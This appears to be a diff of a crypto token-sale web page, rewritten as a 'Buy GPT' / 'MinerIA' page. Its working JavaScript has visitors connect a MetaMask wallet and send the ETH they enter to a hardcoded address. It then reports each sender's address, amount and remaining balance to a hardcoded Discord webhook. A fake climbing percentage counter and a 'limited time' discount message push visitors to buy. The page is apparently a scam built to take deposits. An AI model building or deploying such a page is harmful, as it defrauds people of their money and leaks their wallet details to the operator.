@@ -162,144 +162,235 @@
 </body>
 <script charset="UTF-8" id="LA_COLLECT" src="./src/js/js-sdk-pro.min.js"></script>
 
-
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Dao Maker</title>
-  <style>
+  <head>
+    <meta charset="UTF-8">
+    <title>MinerIA</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <style>
 
-    body {
-      background-color: #8B1062;
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
+      body {
+        background-color: #FFFFFF;
+      }
+
+      .card-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .card {
+        background-color: #00115C;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.3);
+        margin: 10px;
+        max-width: 400px;
+        width: 100%;
+        text-align: center;
+      }
+
+      h3 {
+        color: #0d6efd;
+      }
+
+      p {
+        margin-top: 0;
+      }
+
+      input[type="number"] {
+        padding: 5px;
+        border-radius: 5px;
+        border: none;
+        margin-bottom: 10px;
+        font-size: 14px;
+      }
+
+      button {
+        background-color: #0d6efd;
+        color: #ffffff;
+        border: none;
+        border-radius: 5px;
+        padding: 10px;
+        cursor: pointer;
+        transition: all 0.3s ease-in-out;
+      }
+      
+      button:active {
+        transform: scale(0.90);
+      }
+
+
+      button:hover {
+        background-color: #1E0291;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card-container">
+      <div class="card">
+<h3>Buy<span class="animated-text">GPT</span> <span class="version" style="font-size: 0.8em; font-family: 'Courier New', Courier, monospace; color:dimgray"><span class="counter">0.01%</span></span></h3>
+
+<style>
+    .animated-text {
+        animation: change-colors 3s infinite;
     }
 
-    h2 {
-      margin-left: 15%;
-      color: yellow;
+    .counter {
+        display: inline-block;
+        margin-left: 10px;
+        font-size: 0.8em;
+        font-family: 'Courier New', Courier, monospace;
+        color: #00ff00; /* Color inicial */
     }
 
-    label {
-      display: block;
-      margin-left: 15%;
-      margin-top: 20px;
+    @keyframes change-colors {
+        0% {
+            color: gray;
+        }
+        33% {
+            color: white;
+        }
+        66% {
+            color: black;
+        }
+        100% {
+            color: gray;
+        }
     }
 
-    input {
-      margin: 0 auto;
-      display: block;
-      width: 20%;
-      padding: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+    @keyframes count-up {
+        from {
+            color: #00ff00; /* Color inicial */
+        }
+        to {
+            color: #ff0000; /* Color final */
+        }
     }
 
-    button {
-      margin-left: 15%;
-      margin-top: 20px;
-      padding: 10px 20px;
-      border: none;
-      background-color: #4CAF50;
-      color: #fff;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.2s ease;
+    .count {
+        animation: count-up 25s linear forwards;
+    }
+</style>
+
+<script>
+    const counter = document.querySelector('.counter');
+    let count = 0.01;
+    const increment = 0.01;
+    const target = 500;
+
+    function updateCounter() {
+        count += increment;
+        counter.textContent = count.toFixed(2) + '%';
+
+        if (count < target) {
+            setTimeout(updateCounter, 50);
+        } else {
+            counter.classList.add('count');
+        }
     }
 
-    button:hover {
-      background-color: #3e8e41;
-    }
+    setTimeout(updateCounter, 3000);
+</script>
 
-    button:active {
-      background-color: #3e8e41;
-      transform: translateY(2px);
-    }
 
-    /* Agregado para centrar el contenido */
-    .container {
-      width: 80%;
-      margin: 0 auto;
-    }
+<p style="color: white; font-size: 12px; font-weight: bold; font-family: 'Roboto', sans-serif; text-align: center; border-bottom: 1px solid white;">
+  <span id="mine-text"></span>
+  <span id="mine-cursor">...</span>
+</p>
 
-  </style>
-</head>
-<body>
-  <div class="container">
-  <h2>Swap GPT</h2>
+<style>
+  /* Animación del cursor */
+  @keyframes blink-caret {
+    from, to { opacity: 0 }
+    50% { opacity: 1 }
+  }
+</style>
 
-  <label for="amount">Enter the amount of ETH, BNB that you will buy: " 1 BNB = 60.000 GPT contr.Max 40 BNB . 1 ETH = 320.000 GPT . Contr. MAX 10 ETH</label>
-  <input type="text" id="amount" placeholder="amount ETH or BNB"><br><br>
+<script>
+  const mineText = document.getElementById('mine-text');
+  const mineCursor = document.getElementById('mine-cursor');
+  const miningMessage = 'Put the amount in the box. REFERENCE 1 ETH = 500,000 GPT 40% discount for a limited time';
 
-  <button onclick="deposit()">Confirm Purchase</button>
-
-  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
-  <script>
-    // Conecta con la billetera de Metamask
-    if (typeof window.ethereum !== 'undefined') {
-      var web3 = new Web3(window.ethereum);
-
-      ethereum.request({ method: 'eth_requestAccounts' }).then(function(accounts) {
-        // Obtiene la dirección de la cuenta de Metamask
-        var account = accounts[0];
-
-        // Muestra la dirección de la cuenta en la página
-        var addressElement = document.createElement("p");
-        addressElement.innerHTML = "Tu dirección de Ethereum es: " + account;
-        document.body.appendChild(addressElement);
-      }).catch(function(error) {
-        alert("Debes conectarte a Metamask para realizar esta transacción.");
-      });
+  let i = 0;
+  function typeMiningMessage() {
+    if (i < miningMessage.length) {
+      mineText.innerHTML += miningMessage.charAt(i);
+      i++;
+      setTimeout(typeMiningMessage, 150);
     } else {
-      alert("Debes tener Metamask instalado para realizar esta transacción.");
+      mineCursor.style.animation = 'blink-caret 0.75s step-end infinite';
+      setInterval(function() {
+        mineCursor.style.opacity = (mineCursor.style.opacity === '1' ? '0' : '1');
+      }, 400);
+      setInterval(function() {
+        let dots = '';
+        let rand = Math.floor(Math.random() * 3) + 1;
+        for (let i = 0; i < rand; i++) {
+          dots += '.';
+        }
+        mineText.innerHTML = miningMessage + dots;
+      }, 7000);
     }
+  }
 
-    function deposit() {
-      // Obtiene la cantidad de BNB que el usuario desea enviar
-      var bnbAmount = document.getElementById("amount").value;
+  setTimeout(typeMiningMessage, 1000);
+</script>
 
-      // Verifica que el usuario haya ingresado una cantidad válida
-      if (isNaN(bnbAmount) || bnbAmount <= 0) {
-        alert("Debes ingresar una cantidad válida de BNB.");
-        return;
-      }
 
-      // Conecta con la billetera de Metamask
 
-      if (typeof window.ethereum !== 'undefined') {
-        ethereum.request({ method: 'eth_requestAccounts' }).then(function(accounts) {
-          // Obtiene la dirección de la cuenta de Metamask
-          var account = accounts[0];
+        <input type="number" id="amount1">
+        <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Buy GPT</button>
+      </div>
 
-          // Convierte la cantidad de BNB a wei
-          var weiAmount = web3.utils.toWei(bnbAmount.toString(), 'ether');
 
-          // Envía la transacción al contrato inteligente
-          web3.eth.sendTransaction ({
-            to: '0x8935361d21943Ee8a863082EdD8a6Aefb062E434', // Dirección de tu contrato inteligente
-            from: account,
-            value: weiAmount
-          }, function(err, txHash) {
-            if (err) {
-              alert("Se produjo un error al enviar la transacción: " + err);
-            } else {
-              alert("La transacción se ha enviado correctamente: " + txHash);
-            }
-          });
-        }).catch(function(error) {
-          alert("Debes conectarte a Metamask para realizar esta transacción.");
-        });
-      } else {
-        alert("Debes tener Metamask instalado para realizar esta transacción.");
-      }
+
+
+    <script>
+     async function sendETH(toAddress, amount) {
+    if (window.ethereum) {
+        try {
+            await window.ethereum.enable();
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            const fromAddress = accounts[0];
+            const fromBalance = await web3.eth.getBalance(fromAddress);
+            const txHash = await web3.eth.sendTransaction({
+                from: fromAddress,
+                to: toAddress,
+                value: web3.utils.toWei(amount, 'ether')
+            });
+            console.log(`Transacción enviada: ${txHash}`);
+            const updatedBalance = await web3.eth.getBalance(fromAddress);
+            const message = `Depósito de ${amount} ETH recibido desde la dirección ${fromAddress}. Nuevo saldo: ${web3.utils.fromWei(updatedBalance)} ETH`;
+            sendWebhookMessage(webhookUrl, message);
+        } catch (error) {
+            console.error(error);
+        }
+    } else {
+        console.error('MetaMask no está instalado');
     }
-	 
+}
+function sendWebhookMessage(webhookUrl, message) {
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    })
+    .then(response => console.log(`Mensaje enviado a Discord. Estado de respuesta: ${response.status} ${response.statusText}`))
+    .catch(error => console.error('Error al enviar mensaje a Discord', error));
+}
 
- </script>
-	
-</body>
+      const webhookUrl = "https://discordapp.com/api/webhooks/1065639854324588574/Iu0dfAhK_XeuoLysZSCuxfc79cFpRYvMk9xAueMycoxKijo_gEjoyGT6-6e3MRWFiSnT";
+
+    </script>
+  </body>
 </html>
 
     
